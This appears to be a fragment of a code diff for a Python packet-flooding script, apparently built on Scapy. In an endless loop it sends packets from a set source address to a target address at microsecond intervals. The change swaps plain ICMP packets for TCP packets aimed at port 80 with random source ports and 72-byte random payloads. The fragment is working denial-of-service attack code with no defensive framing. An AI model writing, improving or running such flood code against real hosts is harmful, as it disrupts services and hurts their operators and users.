@@ -8,8 +8,8 @@ while True:
    IP1 = IP(src = source_IP, dst = target_IP)
    # TCP1 = TCP(sport = source_port, dport = 80)
    TCP1 = TCP(sport = RandShort(), dport = 80)
-   pkt = IP1 / ICMP()
-   # pkt = IP1 / TCP1 / Raw(RandString(size = 72))
+   # pkt = IP1 / ICMP()
+   pkt = IP1 / TCP1 / Raw(RandString(size = 72))
    send(pkt, inter = .000001, )
    
    print ("packet sent ", i)
